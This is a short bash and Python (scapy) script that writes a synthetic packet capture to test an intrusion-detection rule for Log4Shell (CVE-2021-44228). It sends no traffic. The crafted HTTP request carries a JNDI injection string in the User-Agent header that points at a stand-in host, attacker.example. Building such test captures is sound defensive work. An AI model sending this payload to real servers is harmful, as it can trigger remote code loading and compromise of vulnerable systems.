#!/usr/bin/env bash
# PoC for SID 9300001 (Log4Shell, CVE-2021-44228) — MUST make this exact SID fire.
# Synthesises a full TCP handshake + HTTP request with a malicious JNDI lookup in
# the User-Agent header. Deterministic, no server, no root.
set -euo pipefail
OUT="${1:?usage: poc.sh <out.pcap>}"
UA='${jndi:ldap://attacker.example/a}' python3 - "$OUT" <<'PY'
import os, sys
from scapy.all import wrpcap, Ether, IP, TCP, Raw
ua = os.environ["UA"].encode()
req = (b"GET /app HTTP/1.1\r\nHost: victim.example\r\n"
       b"User-Agent: " + ua + b"\r\nAccept: */*\r\nConnection: close\r\n\r\n")
c=("10.0.0.9",44444); s=("10.0.0.80",80)
def C(fl,seq,ack,pl=b""):
    return Ether()/IP(src=c[0],dst=s[0])/TCP(sport=c[1],dport=s[1],flags=fl,seq=seq,ack=ack)/(Raw(pl) if pl else b"")
def S(fl,seq,ack,pl=b""):
    return Ether()/IP(src=s[0],dst=c[0])/TCP(sport=s[1],dport=c[1],flags=fl,seq=seq,ack=ack)/(Raw(pl) if pl else b"")
pkts=[C("S",1000,0), S("SA",2000,1001), C("A",1001,2001),
      C("PA",1001,2001,req), S("A",2001,1001+len(req))]
t=1_700_000_000.0
for i,p in enumerate(pkts): p.time=t+i*0.01
wrpcap(sys.argv[1], pkts)
PY
